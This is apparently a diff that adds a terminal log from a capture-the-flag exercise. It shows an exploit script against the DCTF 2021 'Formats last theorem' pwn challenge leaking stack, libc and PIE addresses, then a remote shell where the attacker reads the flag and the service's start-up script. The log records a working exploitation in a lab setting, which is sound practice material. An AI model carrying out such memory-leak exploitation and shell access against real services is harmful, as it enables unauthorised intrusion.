@@ -1,0 +1,30 @@
+mito@ubuntu:~/CTF/DCTF_2021/Pwn_Formats_last_theorem_400$ python solve.py r
+[*] '/home/mito/CTF/DCTF_2021/Pwn_Formats_last_theorem_400/formats_last_theorem'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+[+] Opening connection to dctf-chall-formats-last-theorem.westeurope.azurecontainer.io on port 7482: Done
+stack_leak = 0x7ffee4bd6630
+libc_leak  = 0x7f94d0eb1bf7
+libc_base  = 0x7f94d0e90000
+pie_leak   = 0x557b583d17d0
+pie_base   = 0x557b583d1000
+[*] Switching to interactive mode
+you entered                                                                                              
+                                                                              id
+uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
+$ ls
+flag.txt
+formats_last_theorem
+startService.sh
+$ cat flag.txt
+dctf{N0t_all_7h30r3ms_s0und_g00d}
+$ cat startService.sh
+#!/bin/bash
+chown pilot:pilot /app/formats_last_theorem
+chmod +x /app/formats_last_theorem
+while true; do
+    su pilot -c 'timeout -k 30 1d socat TCP-LISTEN:7482,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 .'
+done
+$ 
